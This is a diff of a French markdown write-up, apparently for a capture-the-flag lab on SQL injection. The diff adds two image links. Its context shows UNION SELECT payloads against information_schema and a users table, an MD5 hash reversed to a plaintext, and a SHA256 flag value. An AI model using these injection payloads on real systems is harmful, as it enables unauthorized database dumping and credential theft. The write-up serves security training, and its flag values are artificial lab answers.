@@ -22,6 +22,8 @@ id=1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
 id=1 or 1=1 UNION SELECT Commentaire, countersign FROM users
 ```
 
+![Alt text](Resources/1.png)
+
 ### **Exemples d’exploitation**
 - **Exfiltration de données** : récupération des identifiants, commentaires, mots de passe hashés.
 - **Compréhension de la logique applicative** : découverte d’une consigne cachée dans le champ "Commentaire" :
@@ -31,6 +33,8 @@ MD5: 5ff9d0165b4f92b14994e5c685cdce28
 Plaintext (via reverse MD5): FortyTwo
 fortytwo (ASCII) → SHA256: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
+
+![Alt text](Resources/2.png)
 
 ### **Cas d’usage**
 - Obtenir un dump complet de la base de données.
